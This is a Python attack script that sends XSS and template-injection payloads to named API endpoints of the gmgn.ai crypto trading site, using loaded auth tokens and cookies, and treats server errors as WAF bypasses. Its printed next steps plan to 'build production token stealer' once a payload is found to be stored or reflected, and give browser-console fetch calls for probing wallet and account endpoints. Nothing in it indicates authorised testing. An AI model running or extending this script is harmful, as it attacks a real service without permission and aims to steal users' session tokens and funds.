#!/usr/bin/env python3
"""
FINAL XSS HUNT - Using REAL endpoints from Str8Gold research
Testing XSS in confirmed working IDOR endpoints + discovery endpoints
"""
import json
import requests
import time

with open("tokens.json") as f:
    tokens = json.load(f)

with open("cookies.json") as f:
    cookies = json.load(f)

ACCESS_TOKEN = tokens["access_token"]

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json, text/plain, */*",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# XSS payloads (stealth first)
PAYLOADS = [
    ("Template", "{{7*7}}"),
    ("Template2", "{{config}}"),
    ("IMG", "<img src=x onerror=alert(1)>"),
    ("SVG", "<svg onload=alert(1)>"),
]

print("="*80)
print("🦊 FINAL XSS HUNT - REAL ENDPOINTS FROM STR8GOLD")
print("="*80)

results = []

# ============================================================================
# STRATEGY: Test XSS in EVERY field of confirmed working endpoints
# ============================================================================

print("\n[1] Testing IDOR endpoints for XSS injection")
print("-" * 60)

# F1: bind_invite - invite_code field
print("\n   [F1] bind_invite - invite_code")
for name, payload in PAYLOADS:
    print(f"      {name}: {payload[:40]}")
    try:
        r = requests.post(
            "https://gmgn.ai/tapi/v1/fourmeme/bind_invite",
            headers=HEADERS,
            cookies=cookies,
            json={
                "chain": "bsc",
                "from_address": "0x0000000000000000000000000000000000000001",
                "invite_code": payload
            },
            timeout=10
        )
        
        print(f"      Status: {r.status_code}", end="")
        
        if r.status_code == 200:
            d = r.json()
            print(f" | Code: {d.get('code')}", end="")
            
            if d.get("code") == 0:
                print(f" | ✅ ACCEPTED!")
                results.append({"endpoint": "bind_invite", "field": "invite_code", "payload": payload})
            elif d.get("code") == 40101600:
                print(f" | ⚠️ Trading auth required")
                break
            else:
                print(f" | ❌ Rejected")
        elif r.status_code == 403:
            print(f" | ❌ WAF")
        elif r.status_code == 500:
            print(f" | ⚠️ Server error (bypassed WAF!)")
        else:
            print(f" | {r.status_code}")
            
    except Exception as e:
        print(f" | Error: {str(e)[:40]}")
    
    time.sleep(0.3)

# F2: dividend_info - from_address field
print("\n   [F2] dividend_info - from_address")
for name, payload in PAYLOADS:
    print(f"      {name}: {payload[:40]}")
    try:
        r = requests.post(
            "https://gmgn.ai/xapi/v1/bsc/flap/dividend_info",
            headers=HEADERS,
            cookies=cookies,
            json={"from_address": payload},
            timeout=10
        )
        
        print(f"      Status: {r.status_code}", end="")
        
        if r.status_code == 200:
            d = r.json()
            print(f" | Code: {d.get('code')}", end="")
            
            if d.get("code") == 0:
                print(f" | ✅ ACCEPTED!")
                # Check if reflected
                if payload in json.dumps(d):
                    print(f"      💀 PAYLOAD REFLECTED IN RESPONSE!")
                    results.append({"endpoint": "dividend_info", "field": "from_address", "payload": payload, "reflected": True})
                else:
                    results.append({"endpoint": "dividend_info", "field": "from_address", "payload": payload})
            else:
                print(f" | ❌")
        elif r.status_code == 403:
            print(f" | ❌ WAF")
        else:
            print(f" | {r.status_code}")
            
    except Exception as e:
        print(f" | Error: {str(e)[:40]}")
    
    time.sleep(0.3)

# Test other info endpoints
info_endpoints = [
    ("referral_info", "https://gmgn.ai/xapi/v1/bsc/flap/referral_info"),
    ("cashback_info", "https://gmgn.ai/xapi/v1/bsc/flap/cashback_info"),
    ("invite_info", "https://gmgn.ai/tapi/v1/fourmeme/invite_info"),
]

for endpoint_name, url in info_endpoints:
    print(f"\n   [{endpoint_name}] - from_address")
    for name, payload in PAYLOADS[:2]:  # Only test first 2
        print(f"      {name}: {payload[:30]}")
        try:
            r = requests.post(
                url,
                headers=HEADERS,
                cookies=cookies,
                json={"from_address": payload, "chain": "bsc"},
                timeout=10
            )
            
            if r.status_code == 200:
                d = r.json()
                if d.get("code") == 0:
                    print(f"      ✅ ACCEPTED!")
                    results.append({"endpoint": endpoint_name, "field": "from_address", "payload": payload})
                    
        except:
            pass
        
        time.sleep(0.3)

# ============================================================================
# NEW STRATEGY: Test GET endpoints with query params (Reflected XSS)
# ============================================================================

print("\n[2] Testing GET endpoints for Reflected XSS")
print("-" * 60)

# Referral code endpoint
print("\n   [get_tg_invitation_code] - No params (can't inject)")

# Rankings endpoint - might have search/filter
print("\n   [rank endpoints] - orderby/direction params")
test_params = [
    ("https://gmgn.ai/defi/quotation/v1/rank/bsc/swaps/24h", {"orderby": "XSS_TEST", "limit": "10"}),
]

for url, params in test_params:
    for name, payload in PAYLOADS[:2]:
        test_params_xss = {k: payload if k == "orderby" else v for k, v in params.items()}
        print(f"      {name}: {payload[:30]}")
        try:
            r = requests.get(
                url,
                params=test_params_xss,
                headers=HEADERS,
                cookies=cookies,
                timeout=10
            )
            
            if r.status_code == 200:
                # Check if payload reflected in response
                if payload in r.text:
                    print(f"      💀 REFLECTED XSS!")
                    results.append({"endpoint": "rank", "type": "reflected", "payload": payload})
                    
        except:
            pass

# ============================================================================
# RESULTS
# ============================================================================

print("\n" + "="*80)
print("🎯 XSS HUNT RESULTS")
print("="*80)

if results:
    print(f"\n✅ Found {len(results)} potential XSS vectors!\n")
    for r in results:
        print(f"• {r['endpoint']} - {r.get('field', 'N/A')}")
        print(f"  Payload: {r['payload']}")
        if r.get('reflected'):
            print(f"  💀 REFLECTED IN RESPONSE!")
        print()
    
    with open("xss_final_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    print("💾 Saved to: xss_final_results.json")
    
    print("\n🚀 NEXT STEPS:")
    print("1. Check where gmgn.ai DISPLAYS these fields:")
    print("   - Wallet lists (if from_address accepted)")
    print("   - Referral dashboard (if invite_code accepted)")
    print("   - Rankings page (if reflected)")
    print("2. Visit that page → XSS should fire!")
    print("3. Build production token stealer with working vector")
    
else:
    print("\n❌ No XSS vectors found via automated testing")
    print("\n💡 FINAL STRATEGY - MANUAL BROWSER TESTING REQUIRED:")
    print()
    print("The endpoints exist but WAF blocks HTML tags from Python.")
    print("You MUST test in BROWSER where your real session bypasses WAF.")
    print()
    print("Open gmgn.ai → F12 → Console → Run these tests:")
    print()
    print("// Test wallet operations")
    print("fetch('https://gmgn.ai/account/wallet/list', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: '{}'}).then(r=>r.json()).then(d=>console.log(d));")
    print()
    print("// Check user info")
    print("fetch('https://gmgn.ai/account/user_info', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'application/json'}, body: '{}'}).then(r=>r.json()).then(d=>console.log(d));")
    print()
    print("Then look for profile/settings update endpoints in Network tab!")

print("\n" + "="*80)
